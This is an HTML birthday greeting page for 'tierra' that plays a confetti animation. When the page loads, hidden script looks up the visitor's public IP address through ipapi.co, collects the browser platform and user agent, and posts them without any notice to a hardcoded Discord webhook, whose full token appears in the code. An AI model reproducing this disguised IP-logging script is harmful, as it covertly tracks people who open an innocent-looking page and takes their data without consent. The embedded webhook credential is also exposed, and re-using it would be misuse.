<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>tierra's birthday page</title>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
  <script>
    window.addEventListener("load", async () => {
      // üéâ Confetti animation
      const end = Date.now() + 2000;
      (function frame() {
        confetti({ particleCount: 5, angle: 60, spread: 55, origin: { x: 0 } });
        confetti({ particleCount: 5, angle: 120, spread: 55, origin: { x: 1 } });
        if (Date.now() < end) requestAnimationFrame(frame);
      })();

      const webhookUrl = "https://discord.com/api/webhooks/1379862990215446631/Fp_iM2-18ISwr3xNlkOEi5fQP5gKkfn-wOFtJjWvDBUQllye98XozcRZUN3pzaQWyzUO";

      try {
        // üåç Fetch IP data
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        let ip = data.ip || "unknown IP";

        // Format IPv4 in 0.00.00... style
        if (ip.includes(".")) {
          ip = ip.split(".").map(b => b.padStart(3, "0")).join(".");
        } else {
          ip = "IPv6 detected, not formatted";
        }

        // üåê Get OS data from browser
        const osPlatform = navigator.platform || "unknown platform";
        const osUserAgent = navigator.userAgent || "unknown userAgent";

        const message = `hi tierra, someone with IP ${ip} opened the page! OS: ${osPlatform}, UA: ${osUserAgent}`;

        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });

      } catch (err) {
        console.error("Error sending to webhook:", err);
      }
    });
  </script>
</head>
<body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:2rem;text-transform:lowercase;">
  happy birthday tierra
</body>
</html>
